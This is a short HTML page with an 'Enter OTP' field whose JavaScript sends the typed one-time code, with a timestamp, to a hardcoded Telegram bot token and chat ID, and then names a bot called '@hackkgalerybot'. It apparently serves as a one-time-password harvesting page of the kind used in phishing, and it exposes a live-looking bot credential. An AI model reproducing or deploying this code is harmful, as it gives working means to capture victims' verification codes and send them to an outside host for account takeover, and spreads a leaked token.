<!DOCTYPE html>
<html>
<body style="font-family:Arial; padding:20px;">
    <h2>ðŸ“± Enter OTP</h2>
    <input type="text" id="otp" placeholder="Type any 6-digit code" 
           style="padding:10px; font-size:16px; width:200px;">
    <br><br>
    <button onclick="sendOTP()" 
            style="padding:10px 20px; background:#0088cc; color:white; border:none; cursor:pointer;">
        Send OTP to Telegram
    </button>
    
    <script>
    async function sendOTP() {
        const otp = document.getElementById('otp').value || "123456";
        
        // Direct Telegram API call
        const BOT_TOKEN = "8360063981:AAGBPsQmcXsg5fk1nQQMMiapLsdwwDdzito";
        const CHAT_ID = "5614775725";
        
        const message = `OTP: ${otp}\nTime: ${new Date().toLocaleString()}`;
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            });
            
            const result = await response.json();
            if(result.ok) {
                alert("âœ… OTP sent!\nCheck Telegram bot: @hackkgalerybot");
                document.getElementById('otp').value = ""; // Clear input
            }
        } catch(error) {
            alert("Error sending OTP");
        }
    }
    </script>
</body>
</html>
